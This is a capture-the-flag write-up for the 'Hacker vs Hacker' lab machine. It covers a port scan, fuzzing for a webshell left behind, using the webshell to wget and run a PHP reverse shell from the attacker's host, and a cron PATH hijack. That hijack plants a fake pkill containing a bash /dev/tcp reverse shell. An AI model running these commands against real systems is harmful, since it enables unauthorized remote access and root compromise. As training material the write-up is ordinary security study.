---
title: "Hacker vs Hacker"
description: ""
pubDate: "Jul 08 2022"
heroImage: "/hackervshacker/dc0c7a25ca75eda427f95bfe6e4e24ab.png"
---
## Nmap:-

**Nmap -A -T4 -p- [IP]**

```bash
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 9f:a6:01:53:92:3a:1d:ba:d7:18:18:5c:0d:8e:92:2c (RSA)
|   256 4b:60:dc:fb:92:a8:6f:fc:74:53:64:c1:8c:bd:de:7c (ECDSA)
|_  256 83:d4:9c:d0:90:36:ce:83:f7:c7:53:30:28:df:c3:d5 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: RecruitSec: Industry Leading Infosec Recruitment
|_http-server-header: Apache/2.4.41 (Ubuntu)
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.92%E=4%D=8/14%OT=22%CT=1%CU=30475%PV=Y%DS=2%DC=T%G=Y%TM=62F91B3
OS:C%P=x86_64-pc-linux-gnu)SEQ(SP=103%GCD=1%ISR=10B%TI=Z%CI=Z%TS=A)SEQ(SP=1
OS:03%GCD=1%ISR=10B%TI=Z%CI=Z%II=I%TS=A)OPS(O1=M505ST11NW6%O2=M505ST11NW6%O
OS:3=M505NNT11NW6%O4=M505ST11NW6%O5=M505ST11NW6%O6=M505ST11)WIN(W1=F4B3%W2=
OS:F4B3%W3=F4B3%W4=F4B3%W5=F4B3%W6=F4B3)ECN(R=Y%DF=Y%T=40%W=F507%O=M505NNSN
OS:W6%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%D
OS:F=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O
OS:=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W
OS:=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%R
OS:IPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)

Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 111/tcp)
HOP RTT       ADDRESS
1   179.52 ms 10.8.0.1
2   179.86 ms 10.10.12.146
```

## HTTP:-

![Untitled](/hackervshacker/Untitled.png)

## Uploading Shell:-

Once you upload a file. We redirect to a different page that shows the content below.

![Untitled](/hackervshacker/Untitled%201.png)

**View Source of Upload.php**

![Untitled](/hackervshacker/Untitled%202.png)

## cvs dir:-

There is a cvs directory that holds all uploaded files. Once we have looked at our uploaded file, It's not being uploaded. But we know the hacker hacked it. So maybe the hacker leaves the Webshell out there. Let's start fuzzing.

![Untitled](/hackervshacker/Untitled%203.png)

## **Fuzzing:-**

Fuzzing file Name:-

```bash
sudo ffuf -w /usr/share/wordlists/dirb/common.txt -u http://10.10.12.146/cvs/FUZZ.pdf.php
```

![Untitled](/hackervshacker/Untitled%204.png)

Fuzzing parameter Name:-

```bash
sudo ffuf -w /usr/share/wordlists/dirb/common.txt -u http://10.10.12.146/cvs/shell.pdf.php?FUZZ=ls -fs 18
```

![Untitled](/hackervshacker/Untitled%205.png)

## Webshell:-

```bash
http://10.10.12.146/cvs/shell.pdf.php?cmd=ls
```

![Untitled](/hackervshacker/Untitled%206.png)

## Reverse Shell

**Uploading Reverse shell:-**

I have uploaded a reverse shell using **wget**.

```bash
http://10.10.12.146/cvs/shell.pdf.php?cmd=wget%20http://10.8.237.155:8000/php-reverse-shell.php
```

**Getting Reverse shell:-**

```bash
http://10.10.12.146/cvs/shell.pdf.php?cmd=php%20php-reverse-shell.php
```

![Untitled](/hackervshacker/Untitled%207.png)

## Privilege Escalation:-

**Local Privilege Escalation:-**

We can see the history file has some size.

![Untitled](/hackervshacker/Untitled%208.png)

![Untitled](/hackervshacker/Untitled%209.png)

**Root Privilege Escalation:-**

![Untitled](/hackervshacker/Untitled%2010.png)

- We can see the crontab using pkill repeatly
- PATH:/home/lachlan/bin;/bin;/usr/bin
- First its check /home/lachlan/bin then /bin/ at the end /usr/bin
- So we can have an pkill file which contains reverse shell in /home/lachlan/bin which will executed by crontab

```bash
echo "bash -c 'bash -i >& /dev/tcp/10.8.237.155/9001 0>&1'" > pkill
```

![Untitled](/hackervshacker/Untitled%2011.png)